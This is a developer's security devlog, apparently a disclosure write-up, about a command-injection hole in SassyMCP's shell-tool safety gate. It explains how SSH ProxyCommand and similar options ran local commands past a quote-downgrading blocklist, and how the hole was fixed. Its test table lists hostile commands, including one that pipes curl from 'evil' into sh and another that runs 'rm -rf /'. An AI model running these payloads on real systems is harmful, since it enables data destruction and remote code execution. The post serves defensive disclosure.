@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<!--
+   Copyright (c) 2026 Shane Smith / Sassy Consulting LLC. All rights reserved.
+   Proprietary source. This notice is Copyright Management Information (17 U.S.C. 1202); removal or alteration prohibited.
+-->
+<html lang="en" data-page="research">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="/theme/seasonal.js"></script>
+    <link rel="stylesheet" href="/theme/tokens.css">
+    <title>My Security Gate's Safest Verdict Was Its Worst Input | Sassy Consulting LLC</title>
+    <link rel="canonical" href="https://sassyconsultingllc.com/research/vibecoding-nested-interpreters-2026">
+    <meta name="description" content="A vulnerability report claimed an RCE in SassyMCP by bypassing a filter. The function was not a filter, and the real hole was a quote heuristic that downgraded arbitrary command execution to safe data.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://sassyconsultingllc.com/research/vibecoding-nested-interpreters-2026">
+    <meta property="og:title" content="My Security Gate's Safest Verdict Was Its Worst Input">
+    <meta property="og:description" content="What happens when your security blocklist treats quoted strings as data, but the downstream tool hands them directly to a local shell.">
+    <meta property="og:image" content="https://sassyconsultingllc.com/android-chrome-512x512.png">
+    <meta property="og:site_name" content="Sassy Consulting LLC">
+    <meta property="article:published_time" content="2026-11-09">
+    <meta property="article:author" content="Shane Smith">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display&family=DM+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: var(--sc-font-sans);
+            background: var(--sc-bg);
+            color: var(--sc-text);
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+        }
+        nav {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+            padding: 0 var(--sc-gutter, 2rem); height: 64px;
+            background: var(--sc-nav-bg); backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--sc-border);
+            display: flex; align-items: center;
+        }
+        nav .container { max-width: 900px; margin: 0 auto; width: 100%; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-weight: 700; font-size: 1.15rem; color: var(--sc-text); text-decoration: none; }
+        .nav-links { display: flex; gap: 1.5rem; }
+        .nav-links a { color: var(--sc-text-2); text-decoration: none; font-size: 0.9rem; }
+        .nav-links a:hover { color: var(--sc-text); }
+
+        article { max-width: 760px; margin: 0 auto; padding: 8rem var(--sc-gutter, 2rem) 5rem; }
+        .kicker {
+            display: inline-block; font-size: 0.75rem; font-weight: 600; text-transform: uppercase;
+            letter-spacing: 0.08em; color: var(--sc-accent-2);
+            background: color-mix(in srgb, var(--sc-accent) 15%, transparent);
+            padding: 0.25rem 0.75rem; border-radius: 6px; margin-bottom: 1rem;
+        }
+        h1 { font-size: clamp(2rem, 5vw, 2.75rem); font-weight: 800; line-height: 1.2; letter-spacing: -0.02em; margin-bottom: 1rem; }
+        .meta { color: var(--sc-text-3); font-size: 0.9rem; margin-bottom: 2.5rem; }
+        h2 { font-size: 1.4rem; font-weight: 700; margin: 2.75rem 0 0.75rem; }
+        h3 { font-size: 1.05rem; font-weight: 700; margin: 1.75rem 0 0.4rem; }
+        p, li { color: var(--sc-text-2); font-size: 1rem; }
+        p { margin-bottom: 1rem; }
+        ul, ol { margin: 0 0 1rem 1.25rem; }
+        li { margin-bottom: 0.4rem; }
+        strong { color: var(--sc-text); }
+        code {
+            font-family: var(--sc-font-mono, 'JetBrains Mono', monospace); font-size: 0.88em;
+            background: var(--sc-surface-2); border: 1px solid var(--sc-border);
+            border-radius: 4px; padding: 0.05em 0.35em; overflow-wrap: anywhere;
+        }
+        pre {
+            background: var(--sc-surface-2); border: 1px solid var(--sc-border);
+            border-radius: 8px; padding: 1rem 1.25rem; margin: 1rem 0 1.5rem;
+            overflow-x: auto; font-family: var(--sc-font-mono, 'JetBrains Mono', monospace);
+            font-size: 0.86em; line-height: 1.55; color: var(--sc-text-2);
+        }
+        pre code {
+            background: transparent; border: none; padding: 0; font-size: inherit; color: inherit;
+        }
+        .summary {
+            background: var(--sc-surface); border: 1px solid var(--sc-border);
+            border-radius: var(--sc-radius-card, 16px); padding: 1.5rem 1.75rem; margin-bottom: 2rem;
+        }
+        .summary p:last-child { margin-bottom: 0; }
+        .table-wrap { overflow-x: auto; margin: 1rem 0 1.5rem; border: 1px solid var(--sc-border); border-radius: 10px; }
+        table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+        th, td { text-align: left; padding: 0.6rem 0.8rem; border-bottom: 1px solid var(--sc-border); vertical-align: top; }
+        th { color: var(--sc-text); background: var(--sc-surface); font-weight: 600; white-space: nowrap; }
+        td { color: var(--sc-text-2); }
+        tr:last-child td { border-bottom: none; }
+        .sev { font-weight: 600; white-space: nowrap; }
+        .sev.high { color: var(--sc-warn); }
+        .sev.low { color: var(--sc-ok); }
+        .note { border-left: 3px solid var(--sc-accent); padding: 0.25rem 0 0.25rem 1rem; margin: 1.5rem 0; }
+        a { color: var(--sc-accent-2); }
+
+        footer { border-top: 1px solid var(--sc-border); padding: 3rem var(--sc-gutter, 2rem); }
+        .footer-content { max-width: 900px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1.5rem; }
+        .footer-left { color: var(--sc-text-3); font-size: 0.9rem; }
+        .footer-left strong { color: var(--sc-text-2); }
+        .footer-links { display: flex; gap: 1.5rem; }
+        .footer-links a { color: var(--sc-text-2); text-decoration: none; font-size: 0.9rem; }
+
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            article { padding: 6.5rem var(--sc-gutter, 1rem) 4rem; }
+            footer { padding-left: var(--sc-gutter, 1rem); padding-right: var(--sc-gutter, 1rem); }
+            .footer-content { flex-direction: column; text-align: center; }
+        }
+    </style>
+    <link rel="stylesheet" href="/theme/fall.css">
+    <link rel="stylesheet" href="/theme/winter.css">
+</head>
+<body>
+
+    <nav>
+        <div class="container">
+            <a href="/" class="logo">Sassy Consulting</a>
+            <div class="nav-links">
+                <a href="/">Home</a>
+                <a href="/#products">Products</a>
+                <a href="/">Sassy Browser</a>
+                <a href="/research/">Research</a>
+            </div>
+        </div>
+    </nav>
+
+    <article>
+        <span class="kicker">Devlog &middot; Security Architecture</span>
+        <h1>My security gate's safest verdict was its worst input</h1>
+        <p class="meta">Sassy Consulting LLC &middot; Shane Smith &middot; Published 2026-11-09 &middot; Incident occurred 2026-09-20</p>
+
+        <div class="summary">
+            <p><strong>Summary.</strong> A security researcher emailed me reporting a critical remote code execution vulnerability in SassyMCP. The report claimed a bypass of our <code>harden_ssh</code> filter via SSH ProxyCommand parameter injection. The researcher was right that the vulnerability was real, but wrong about the mechanism. <code>harden_ssh</code> was never a filter &mdash; it was a two-line ergonomics helper to append <code>-o BatchMode=yes</code>. The actual vulnerability was one layer deeper: our command security gate downgraded dangerous tokens found inside quoted strings to "low" severity, treating them as harmless string literals. Because SSH options must be quoted, the exact heuristic designed to prevent false positives waved through arbitrary local shell execution.</p>
+        </div>
+
+        <h2>The vulnerability report</h2>
+        <p>In September 2026, an external researcher reached out via GitHub Issue #38 and follow-up email. The claim was stark: <code>sassy_shell</code> allowed arbitrary command execution by bypassing the <code>harden_ssh</code> filter using SSH <code>ProxyCommand</code> parameter injection. Attached was a password-protected ZIP archive.</p>
+        <p>I did not open the archive. A password-protected ZIP from an unknown email address is the canonical method for bypassing automated AV scanners. More importantly, I did not need it. The description named the mechanism, and the mechanism was verifiable directly against my own source in two minutes. Testing from the conceptual model rather than running untrusted binary payloads is safer and forces an understanding of what the code actually does.</p>
+
+        <h2>The red herring: harden_ssh</h2>
+        <p>The report focused on a function named <code>harden_ssh</code> in <code>hermes_node.py</code>. Looking at the implementation immediately showed why the report's explanation was wrong:</p>
+        <pre><code>def harden_ssh(cmd):
+    """SassyMCP edge: sassy_shell wedges on interactive SSH. Force non-interactive."""
+    if cmd.strip().lower().startswith("ssh ") and "batchmode" not in cmd.lower():
+        return cmd.replace("ssh ", "ssh -o BatchMode=yes -o ConnectTimeout=5 ", 1)
+    return cmd</code></pre>
+        <p>This was never an input filter. It was an ergonomics shim written so that automated background tool calls would not hang indefinitely on an interactive password prompt. There was no security boundary here to bypass.</p>
+        <p>That realization made the situation worse, not better. If <code>harden_ssh</code> was not the guard, why did the command run? The failure had to reside in the shared validation layer that all shell execution tools rely on.</p>
+
+        <h2>The real defect: Heuristic inverted by nested execution</h2>
+        <p>To inspect what the gate was actually deciding, I tested eight variations against <code>validate_command_tiered</code> and <code>detect_delete_intent</code>:</p>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Command Input</th><th>Blocklist Clean?</th><th>Tier Verdict</th><th>Delete Detected?</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>ssh -o ProxyCommand="cmd /c calc.exe" user@host</code></td><td>True</td><td>-</td><td>False</td></tr>
+                    <tr><td><code>ssh -oProxyCommand=calc.exe user@host</code></td><td>True</td><td>-</td><td>False</td></tr>
+                    <tr><td><code>ssh -o BatchMode=yes -o ProxyCommand="powershell -c Remove-Item..."</code></td><td>True</td><td>-</td><td>False</td></tr>
+                    <tr><td><code>ssh -o PermitLocalCommand=yes -o LocalCommand="cmd /c whoami"</code></td><td>True</td><td>-</td><td>False</td></tr>
+                    <tr><td><code>ssh -o KnownHostsCommand="/tmp/pwn" user@host</code></td><td>True</td><td>-</td><td>False</td></tr>
+                    <tr><td><code>scp -o ProxyCommand="curl http://evil/x|sh" a b</code></td><td>True</td><td>-</td><td>False</td></tr>
+                    <tr><td><code>ssh -F /tmp/evil_config user@host</code></td><td>True</td><td>-</td><td>False</td></tr>
+                    <tr><td><code>ssh -o ProxyCommand="rm -rf /" user@host</code></td><td>False</td><td class="sev low">low</td><td>False</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <p>Seven of the eight payloads returned completely clean verdicts. The eighth line &mdash; <code>ssh -o ProxyCommand="rm -rf /" user@host</code> &mdash; was the most dangerous, and the gate assigned it tier <code>low</code>.</p>
+        <p>In SassyMCP's execution gate, tier <code>low</code> logs <code>blocklist_literal_allowed</code> and falls through to execution. The worst payload in the entire test suite was the one the security gate had cleared with the highest confidence.</p>
+
+        <h2>The mechanics of the bypass</h2>
+        <p>Two distinct design assumptions interacted to produce a full local shell escape:</p>
+        <ol>
+            <li><strong>Missing wrapper recursion.</strong> <code>detect_delete_intent</code> recursed into nested commands only if the wrapper command matched an explicit table: <code>powershell</code>, <code>cmd</code>, <code>wsl</code>, <code>bash</code>, <code>sh</code>, <code>zsh</code>. <code>ssh</code> was not in the table. The gate assumed <code>ssh</code> was a network client communicating with an external system.</li>
+            <li><strong>The quote-downgrade heuristic.</strong> <code>validate_command_tiered</code> searched for destructive commands like <code>rm -rf</code>, <code>format</code>, and <code>dd</code>. If a match occurred inside a quoted string, it downgraded the severity to <code>low</code>. The logic was clear: in <code>echo "format the disk"</code>, the dangerous phrase is string data, not an executable instruction.</li>
+        </ol>
+        <p>When applied to OpenSSH, that heuristic was fatal. SSH command-line options containing spaces must be wrapped in quotes. Furthermore, OpenSSH does not execute <code>ProxyCommand</code>, <code>LocalCommand</code>, or <code>KnownHostsCommand</code> on the remote target; it spawns them on the <strong>local</strong> machine via the local shell before establishing the TCP connection.</p>
+        <p>The remote host did not even need to exist or be reachable. <code>ssh -o ProxyCommand="rm -rf /" nonexistent.invalid</code> executed <code>rm -rf /</code> locally before any network packet was transmitted. The exact heuristic built to suppress false positives on string literals was what cleared arbitrary local execution.</p>
+
+        <h2>Blast radius</h2>
+        <p>Tracing the codebase revealed that this validation gate was not isolated to <code>sassy_shell</code>. Five tools used the identical validation pipeline:</p>
+        <ul>
+            <li><code>sassy_shell</code></li>
+            <li><code>sassy_linux_exec</code></li>
+            <li><code>sassy_session_start</code></li>
+            <li><code>sassy_session_send</code></li>
+            <li><code>sassy_adb_shell</code></li>
+        </ul>
+        <p>If I had patched <code>harden_ssh</code> where the vulnerability report pointed, none of the other four tools would have been protected, and <code>sassy_shell</code> would still have been vulnerable to variations without leading spaces.</p>
+
+        <h2>The fix</h2>
+        <p>The fix required intercepting SSH local-execution directives in <code>sassymcp/modules/_security.py</code> before the command reached the string-parsing and quote-downgrading blocklist:</p>
+        <pre><code>ssh_hit, _ssh_label, ssh_detail = detect_ssh_exec_option(command)
+if ssh_hit:
+    return False, "high", (
+        f"Command blocked (safety): {ssh_detail}. Use ProxyJump "
+        "('ssh -J jumphost target') for jump hosts, or run this ssh "
+        "invocation outside the MCP tool surface."
+    )</code></pre>
+        <p>The helper <code>detect_ssh_exec_option</code> inspects the unstripped raw command string, deliberately avoiding quote removal. It checks for SSH binaries accompanied by <code>ProxyCommand</code>, <code>LocalCommand</code>, <code>PermitLocalCommand</code>, or <code>KnownHostsCommand</code>. It also inspects configuration loading via <code>-F</code> or <code>-o Include=</code> to prevent redirecting to an untrusted local SSH config file outside <code>~/.ssh</code>.</p>
+        <p>All eight test payloads were re-tested; each now evaluates to <code>tier=high</code> and execution is denied. Twenty-six unit tests were added to guarantee the boundary holds against varying whitespace, case formatting, and combined flags. The patch shipped in SassyMCP <strong>v1.15.2</strong>.</p>
+
+        <h2>Lessons for agent systems</h2>
+        <ul>
+            <li><strong>Inspect the next interpreter, not the outer command.</strong> Checking whether a string is enclosed in quotes answers whether the outer shell treats it as data. It says nothing about what the program receiving that string will do with it. Whenever an application accepts arguments that it hands to a sub-shell, the argument is code.</li>
+            <li><strong>Security filters cannot rely on ergonomics wrappers.</strong> A function created to ensure smooth automation (such as forcing non-interactive flags) must never be treated as an authorization boundary.</li>
+            <li><strong>Trace the shared gate.</strong> When a defect is discovered in one tool, trace every caller sharing the validation logic. One hole in a centralized validator is a hole in every exposed surface.</li>
+            <li><strong>Verify claims against code, not reports.</strong> Reporters frequently identify real vulnerabilities while misidentifying the underlying mechanism. Fixing what the reporter described would have left the hole wide open.</li>
+        </ul>
+
+        <h2>Contact</h2>
+        <p>To report a security issue in SassyMCP or any Sassy Consulting LLC tool, visit our <a href="/contact">contact page</a> or review our disclosures on GitHub.</p>
+    </article>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-left" data-theme-toggle>
+                &copy; 2026 <strong>Sassy Consulting LLC</strong> &mdash; Veteran-Owned, Wisconsin-Made
+            </div>
+            <div class="footer-links">
+                <a href="/">Home</a>
+                <a href="/#products">Products</a>
+                <a href="/">Sassy Browser</a>
+                <a href="/research/">Research</a>
+            </div>
+        </div>
+    </footer>
+
+</body>
+</html>
